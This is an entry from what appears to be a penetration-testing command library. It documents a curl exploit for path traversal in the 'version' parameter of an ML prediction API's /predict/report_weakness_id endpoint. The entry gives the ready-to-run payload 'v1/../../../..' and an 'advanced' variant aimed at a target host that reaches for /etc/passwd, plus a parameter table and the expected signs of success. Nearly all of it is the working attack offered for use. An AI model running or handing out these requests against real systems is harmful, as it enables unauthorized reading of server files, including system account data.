---
id: 5f1df159-b4f3-4802-a354-5c873d816d74
name: curl-path-traversal-version
type: command
executor: bash
data: >-
  curl -X POST http://localhost:8082/predict/report_weakness_id -H
  'content-type: application/json' -d'{"version":"v1/../../../..", "trained_at":
  "2023-01-01T00:00:00Z", "input": [{"title": "test xss",
  "num_of_top_predictions": 3}]}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:20.694Z'
platforms:
  - Linux
  - Docker
tags:
  - path-traversal
  - exploit
verified: false
validated: true
submitted: true
---

# curl-path-traversal-version

## Command

```bash
curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1/../../../..", "trained_at": "2023-01-01T00:00:00Z", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
```

## Description

Sends a POST request exploiting path traversal in the version parameter to load arbitrary files via directory traversal in the ML API.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `http://localhost:8082/predict/report_weakness_id` | Vulnerable endpoint URL | Yes |
| `-H 'content-type: application/json'` | JSON header | Yes |
| `-d'{...}'` | Payload with traversal in version | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1/../../../..", "trained_at": "2023-01-01T00:00:00Z", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
```

### Advanced Usage

For deeper traversal:

```bash
curl -X POST http://target:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1/../../../../etc/passwd", "trained_at": "2023-01-01T00:00:00Z", "input": [{"title": "test", "num_of_top_predictions": 3}]}' -v
```

## Expected Output

Response showing traversal success through errors or data from loaded files, such as tokenizer initialization from unexpected paths.

## Related

- [[commands/curl-path-traversal-trained_at]]
- [[procedures/Exploit-Path-Traversal-via-version]]
